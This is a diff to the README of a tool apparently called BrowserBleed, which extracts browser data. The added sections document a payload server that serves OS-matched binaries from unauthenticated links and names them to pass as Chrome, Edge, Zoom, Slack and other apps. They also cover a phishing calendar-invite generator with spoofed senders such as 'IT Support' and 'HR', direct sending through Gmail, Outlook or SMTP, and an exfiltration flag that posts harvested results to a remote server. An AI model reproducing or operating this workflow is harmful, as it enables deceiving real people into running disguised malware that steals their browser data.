@@ -280,7 +280,7 @@ sudo python3 BrowserBleed_linux.py --exfil https://your-server.com --exfil-key Y
 
 ## Report Server
 
-BrowserBleed includes an optional self-hosted report server (`server/`) for receiving and viewing results from remote engagements. When `--exfil` is used, BrowserBleed POSTs the `.txt` and `.csv` to the server after the run; the report URL is appended to `bb_results.txt`.
+BrowserBleed includes a self-hosted report server (`server/`) for receiving results, managing payloads, and delivering them to targets. When `--exfil` is used, BrowserBleed POSTs the `.txt` and `.csv` to the server after the run; the report URL is appended to `bb_results.txt`.
 
 ### Security model
 
@@ -327,6 +327,108 @@ To update the binary after code changes:
 bash deploy/deploy-binary.sh   # rebuilds, uploads, restarts service
 ```
 
+### Server endpoints
+
+| Path | Auth | Description |
+|------|------|-------------|
+| `GET /` | Required | Reports index |
+| `POST /login` | — | Browser login (sets session cookie) |
+| `POST /upload` | Bearer | Receive payload report (called by the binary) |
+| `GET /r/{id}` | Required | View report |
+| `POST /r/{id}/delete` | Required | Delete single report |
+| `POST /r/delete-bulk` | Required | Delete multiple reports — JSON `{"ids":[...]}` |
+| `GET /r/export-bulk` | Required | Export reports as zip — query `?ids=...` |
+| `GET /payloads` | Required | Payload manager + build command generator |
+| `POST /payloads` | Required | Upload payload file |
+| `GET /payloads/{name}` | Required | Download payload file |
+| `POST /payloads/{name}/delete` | Required | Delete payload file |
+| `GET /p/{preset}` | **None** | Smart delivery — detects visitor OS, serves matching payload |
+| `GET /builds` | Required | List build queue (JSON) |
+| `POST /builds` | Required | Queue a new Windows build job |
+| `POST /builds/claim` | Bearer | Build agent: claim the next pending job |
+| `GET /builds/{id}/icon` | Bearer | Build agent: download custom icon for a job |
+| `POST /builds/{id}/complete` | Bearer | Build agent: upload completed exe |
+| `POST /builds/{id}/fail` | Bearer | Build agent: report a build failure |
+| `POST /builds/{id}/delete` | Required | Remove a job from the queue |
+| `GET /invite/config` | Required | Get email delivery config (SMTP settings) |
+| `POST /invite/config` | Required | Save email delivery config |
+| `POST /invite/send` | Required | Send a calendar invite via email |
+| `GET /auth/status` | Required | OAuth connection status (Gmail / Outlook) |
+| `GET /auth/{provider}/connect` | Required | Start OAuth flow |
+| `GET /auth/{provider}/callback` | — | OAuth redirect handler |
+| `POST /auth/{provider}/disconnect` | Required | Remove stored OAuth token |
+
+`/p/{preset}` is intentionally unauthenticated — it goes inside ICS invites sent to targets.
+
+---
+
+## Targeting & Delivery
+
+### Smart delivery links
+
+Every uploaded payload automatically gets a smart delivery URL:
+
+```
+https://reports.yourserver.com/p/chrome
+https://reports.yourserver.com/p/slack
+```
+
+When a target visits the link, the server reads their `User-Agent` and serves the right binary:
+- **Windows** → serves the disguised `.exe` (download name: `chrome_crashpad_handler.exe`)
+- **macOS** → serves the Mac binary (download name: `Google Chrome Helper`)
+- **Linux** → serves the Linux binary (download name: `google-chrome`)
+
+One link works for all three platforms. Smart links are shown in the Payloads UI next to each uploaded file, and are embedded automatically by both `invite.py` and the web-based invite builder.
+
+### Calendar invites
+
+Deliver the smart link inside a convincing calendar invite. Two ways to generate:
+
+**CLI — `invite.py`:**
+```bash
+python3 invite.py --preset chrome \
+    --from-name "Sarah Johnson" --from-email sarah@company.com \
+    --to target@victim.com
+
+# Multiple recipients, Teams disguise:
+python3 invite.py --preset teams \
+    --from-name "IT Support" --from-email it@company.com \
+    --to alice@victim.com --to bob@victim.com \
+    --subject "Mandatory Security Training" --disguise teams \
+    --date "2026-07-01 09:00"
+
+# Send directly via email (requires --send and SMTP/OAuth config):
+python3 invite.py --preset zoom --send \
+    --from-name "HR" --from-email hr@company.com \
+    --to target@victim.com
+```
+
+Available disguises: `zoom` (default for most presets), `teams`, `google-meet`, `generic`
+
+**Web UI** — the Payloads page has a built-in invite builder with the same options, a live preview of the invite description, and a Download ICS button. Configure email delivery in the Email Settings section to send directly from the browser.
+
+### Email delivery
+
+The server supports sending invites directly via:
+
+| Method | Setup |
+|--------|-------|
+| **Gmail OAuth** | Click "Connect Gmail" in Email Settings → authorises via Google OAuth 2.0 → no password stored |
+| **Outlook OAuth** | Click "Connect Outlook" → authorises via Microsoft identity platform → no password stored |
+| **Custom SMTP** | Enter host/port/credentials → works with any SMTP relay |
+
+OAuth tokens are stored encrypted at rest using the same `ENCRYPTION_KEY` as reports. Tokens are refreshed automatically.
+
+### Build agent
+
+To build Windows payloads remotely from a Windows machine without local Go/Python:
+
+```
+python build_agent.py --server https://reports.yourserver.com --key YOUR_API_KEY
+```
+
+Keep this running on your Windows build machine. Queue builds from the Payloads UI (Build Command section → "Queue build on agent"), and the agent picks them up, runs `build_windows.ps1`, and uploads the `.exe` automatically. Supports custom icons and company metadata per job.
+
 ---
 
 ## Building your own binaries
@@ -368,19 +470,21 @@ Reads `DOMAIN` and `BB_API_KEY` from `deploy/config`, substitutes them into a te
 
 Available presets (set exe name, process name, icon, and Properties metadata automatically):
 
-| # | Preset | Exe name | Appears as |
-|---|--------|----------|------------|
-| 1 | `chrome` | `chrome.exe` | Google LLC - Google Chrome |
-| 2 | `edge` | `edge.exe` | Microsoft Corporation - Microsoft Edge |
-| 3 | `brave` | `brave.exe` | Brave Software, Inc - Brave Browser |
-| 4 | `firefox` | `firefox.exe` | Mozilla Corporation - Mozilla Firefox |
-| 5 | `opera` | `opera.exe` | Opera Software AS - Opera internet browser |
-| 6 | `slack` | `slack.exe` | Slack Technologies, Inc. - Slack |
-| 7 | `discord` | `discord.exe` | Discord Inc. - Discord |
-| 8 | `teams` | `ms-teams.exe` | Microsoft Corporation - Microsoft Teams |
-| 9 | `zoom` | `zoom.exe` | Zoom Video Communications, Inc. - Zoom |
-| 10 | `whatsapp` | `whatsapp.exe` | WhatsApp LLC - WhatsApp |
-| 11 | `telegram` | `telegram.exe` | Telegram FZ-LLC - Telegram Desktop |
+| # | Preset | Exe on disk | Download name (smart link) | Company / description |
+|---|--------|-------------|----------------------------|-----------------------|
+| 1 | `chrome` | `chrome.exe` | `chrome_crashpad_handler.exe` | Google LLC - Google Chrome |
+| 2 | `edge` | `edge.exe` | `msedge_crashpad_handler.exe` | Microsoft Corporation - Microsoft Edge |
+| 3 | `brave` | `brave.exe` | `brave_crashpad_handler.exe` | Brave Software, Inc - Brave Browser |
+| 4 | `firefox` | `firefox.exe` | `plugin-container.exe` | Mozilla Corporation - Mozilla Firefox |
+| 5 | `opera` | `opera.exe` | `opera_crashpad_handler.exe` | Opera Software AS - Opera internet browser |
+| 6 | `slack` | `slack.exe` | `slack.exe` | Slack Technologies, Inc. - Slack |
+| 7 | `discord` | `discord.exe` | `Discord.exe` | Discord Inc. - Discord |
+| 8 | `teams` | `ms-teams.exe` | `ms-teams.exe` | Microsoft Corporation - Microsoft Teams |
+| 9 | `zoom` | `zoom.exe` | `Zoom.exe` | Zoom Video Communications, Inc. - Zoom |
+| 10 | `whatsapp` | `whatsapp.exe` | `WhatsApp.exe` | WhatsApp LLC - WhatsApp |
+| 11 | `telegram` | `telegram.exe` | `Telegram.exe` | Telegram FZ-LLC - Telegram Desktop |
+
+"Exe on disk" is the file stored in the payload server and on the build machine. "Download name" is what the target's browser saves when they click the smart link — a more plausible helper process name.
 
 Icons are pulled automatically from the app's install path if it's installed on the build machine. If the app isn't installed, the binary is built without a custom icon.
 
@@ -414,19 +518,21 @@ Reads `DOMAIN` and `BB_API_KEY` from `deploy/config`, patches a temp copy of `Br
 
 Available presets:
 
-| # | Preset | Binary name | Blends in as |
-|---|--------|-------------|--------------|
-| 1 | `chrome` | `google-chrome` | Google Chrome process |
-| 2 | `edge` | `microsoft-edge` | Microsoft Edge process |
-| 3 | `brave` | `brave-browser` | Brave Browser process |
-| 4 | `firefox` | `firefox` | Mozilla Firefox process |
-| 5 | `opera` | `opera` | Opera process |
-| 6 | `slack` | `slack` | Slack process |
-| 7 | `discord` | `discord` | Discord process |
-| 8 | `teams` | `teams` | Microsoft Teams process |
-| 9 | `zoom` | `zoom` | Zoom process |
-| 10 | `whatsapp` | `whatsapp-desktop` | WhatsApp Desktop process |
-| 11 | `telegram` | `telegram-desktop` | Telegram Desktop process |
+| # | Preset | Binary on disk | Download name (smart link) | Process in Activity Monitor |
+|---|--------|----------------|----------------------------|-----------------------------|
+| 1 | `chrome` | `google-chrome` | `Google Chrome Helper` | google-chrome |
+| 2 | `edge` | `microsoft-edge` | `Microsoft Edge Helper` | microsoft-edge |
+| 3 | `brave` | `brave-browser` | `Brave Browser Helper` | brave-browser |
+| 4 | `firefox` | `firefox` | `Firefox` | firefox |
+| 5 | `opera` | `opera` | `Opera Helper` | opera |
+| 6 | `slack` | `slack` | `Slack Helper` | slack |
+| 7 | `discord` | `discord` | `Discord Helper` | discord |
+| 8 | `teams` | `teams` | `Microsoft Teams Helper` | teams |
+| 9 | `zoom` | `zoom` | `ZoomHelper` | zoom |
+| 10 | `whatsapp` | `whatsapp-desktop` | `WhatsApp Helper` | whatsapp-desktop |
+| 11 | `telegram` | `telegram-desktop` | `Telegram Desktop` | telegram-desktop |
+
+The macOS binary is a single universal extractor — all presets produce the same `BrowserBleed_mac.py` code, just named and disguised differently. Upload any one of them; the smart link will serve it for all macOS visitors with the appropriate download name.
 
 Custom binary name:
 ```bash
